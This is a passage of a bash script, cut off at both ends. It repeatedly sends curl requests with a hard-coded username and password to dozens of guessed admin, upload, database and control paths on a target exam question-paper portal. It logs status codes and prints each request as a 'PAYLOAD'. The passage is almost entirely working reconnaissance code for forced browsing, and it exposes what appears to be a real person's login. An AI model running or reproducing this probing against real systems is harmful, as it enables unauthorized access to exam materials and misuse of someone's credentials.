${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-DataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlingQPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlingQPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlingQPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [HandlerQPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}HandlerQPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}HandlerQPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Dashboard/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Dashboard/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Dashboard/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ManagementQPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ManagementQPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ManagementQPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Portal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Portal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Portal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkWorkflow/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkWorkflow/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkWorkflow/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDoc_Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDoc_Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDoc_Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUpload_QP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUpload_QP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaper-Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaper-Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaper-Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MgmtQuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MgmtQuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MgmtQuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDatabaseManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDatabaseManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDatabaseManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DashboardQPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DashboardQPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DashboardQPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [PortalQPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}PortalQPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}PortalQPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManager-Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManager-Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManager-Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystemService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystemService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystemService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem-System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem-System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem-System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileUploadQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileUploadQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUploadQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaper_Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaper_Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaper_Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQP/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQP/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQP/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUpload-QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUpload-QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUpload-QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [WorkflowQPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}WorkflowQPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}WorkflowQPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Ops/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Ops/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Ops/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPCloud/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPCloud/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPCloud/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [OpsQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}OpsQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}OpsQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control-QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform_QPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform_QPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform_QPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteQPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteQPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteQPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_MonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_MonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_MonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatchUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatchUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatchUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline_QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline_QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline_QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUpload-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUpload-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUpload-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControlQPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControlQPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControlQPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite-ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite-ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite-ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Manager-QPUploader/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Manager-QPUploader/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Manager-QPUploader/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QstnPaper/]:"
